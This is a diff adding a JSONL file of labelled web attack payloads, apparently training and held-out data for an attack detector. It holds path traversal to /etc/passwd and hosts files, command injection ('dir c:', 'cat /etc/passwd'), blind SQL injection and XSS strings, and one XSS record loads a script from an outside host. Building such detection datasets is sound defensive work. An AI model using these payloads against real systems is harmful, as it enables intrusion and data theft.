@@ -1,0 +1,52 @@
+{"value": "..../%uF025..../%uF025..../%uF025..../%uF025etc%uF025passwd", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2550], "id": 0}
+{"value": "..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 364], "id": 1}
+{"value": "..../%u2216..../%u2216..../%u2216..../%u2216etc%u2216issue", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2355], "id": 2}
+{"value": "..../0x5c..../0x5c..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2309], "id": 3}
+{"value": ".?%u2215etc%u2215passwd", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 670], "id": 4}
+{"value": "..../%u2215..../%u2215..../%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 817], "id": 5}
+{"value": "..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1520], "id": 6}
+{"value": "web-inf/web.xml", "cls": "lfi", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1566], "id": 7}
+{"value": "0x2e0x2e0x2fetc0x2fissue", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3239], "id": 8}
+{"value": "??%uEFC8etc%uEFC8passwd", "cls": "lfi", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 380], "id": 9}
+{"value": "..../0x2fetc0x2fpasswd", "cls": "lfi", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3605], "id": 10}
+{"value": "..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8..../%uEFC8etc%uEFC8issue", "cls": "lfi", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 341], "id": 11}
+{"value": "?.0x2fetc0x2fissue", "cls": "lfi", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1296], "id": 12}
+{"value": ".?%u2216etc%u2216passwd", "cls": "lfi", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3595], "id": 13}
+{"value": "..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qf..../%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts", "cls": "lfi", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2222], "id": 14}
+{"value": "\"`true`\"", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 343], "id": 15}
+{"value": "&&+|+dir c:/", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3519], "id": 16}
+{"value": "+|+dir+c:+|", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3538], "id": 17}
+{"value": "\"`false`\"", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 356], "id": 18}
+{"value": "`false`", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1881], "id": 19}
+{"value": "+|+dir+c:/", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3603], "id": 20}
+{"value": ";+$u+cat+/etc$u/passwd$u", "cls": "rce", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 580], "id": 21}
+{"value": "dir+c:\",7,cmdi,anom ||+dir|c:\"", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2347], "id": 22}
+{"value": "$+|+dir+c:/", "cls": "rce", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1063], "id": 23}
+{"value": "+dir+c:+|", "cls": "rce", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 45], "id": 24}
+{"value": "+|+dir+c:/+|", "cls": "rce", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 552], "id": 25}
+{"value": "`true`", "cls": "rce", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3687], "id": 26}
+{"value": "+|+dir+c:\",10,cmdi,anom $+|+dir+c:\"", "cls": "rce", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 671], "id": 27}
+{"value": "& net view", "cls": "rce", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3532], "id": 28}
+{"value": "1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)", "cls": "sqli", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1684], "id": 29}
+{"value": " OR 1=0", "cls": "sqli", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3612], "id": 30}
+{"value": " AND 1=0", "cls": "sqli", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1792], "id": 31}
+{"value": "(select * from generate_series(3906,3906,case when (3906=3906) then 1 else 0 end) limit 1)", "cls": "sqli", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3065], "id": 32}
+{"value": "1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--", "cls": "sqli", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 3281], "id": 33}
+{"value": "select session_user;", "cls": "sqli", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 1948], "id": 34}
+{"value": "(select * from generate_series(4990,4990,case when (4990=5065) then 1 else 0 end) limit 1)", "cls": "sqli", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 3136], "id": 35}
+{"value": " HAVING 1=1#", "cls": "sqli", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 4485], "id": 36}
+{"value": "1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)", "cls": "sqli", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 4112], "id": 37}
+{"value": "select @@servername", "cls": "sqli", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 4191], "id": 38}
+{"value": " AND 1=1", "cls": "sqli", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 3452], "id": 39}
+{"value": " HAVING 1=0#", "cls": "sqli", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 1738], "id": 40}
+{"value": "1;select * from generate_series(3341,3341,case when (3341=3072) then 1 else 0 end) limit 1--", "cls": "sqli", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 4107], "id": 41}
+{"value": "1,(select * from generate_series(9108,9108,case when (9108=2900) then 1 else 0 end) limit 1)", "cls": "sqli", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 2039], "id": 42}
+{"value": " AND 1=1-- ", "cls": "sqli", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 5110], "id": 43}
+{"value": "<a href=\"http://server.com/\">crosssitescripting</a>", "cls": "xss", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 628], "id": 44}
+{"value": "<a href=\"http://www.google.com\">crosssitescripting</a>", "cls": "xss", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 3112], "id": 45}
+{"value": "write(1) autofocus><input autofocus>", "cls": "xss", "part": "gieo", "src": "httpparams", "loc": ["t2loc-20261115-180120", "loc-cong-2", 2269], "id": 46}
+{"value": "y=<a>confirm</a>;content[y](123)", "cls": "xss", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1589], "id": 47}
+{"value": "<Input value = \"XSS\" type = text>", "cls": "xss", "part": "gieo", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 1484], "id": 48}
+{"value": "y=<a>alert</a>;content[y](123)", "cls": "xss", "part": "giu_lai", "src": "openappsec_mal", "loc": ["t2loc-20261115-180120", "loc-cong-2", 740], "id": 49}
+{"value": "<layer id=xss src=\"http://ha.ckers.org/scriptlet.html\"></layer>", "cls": "xss", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 3927], "id": 50}
+{"value": "'';!--\"<crosssitescripting>=&{()}", "cls": "xss", "part": "giu_lai", "src": "httpparams", "loc": ["t2loc-20261115-180954", "loc-cong-2b", 95], "id": 51}
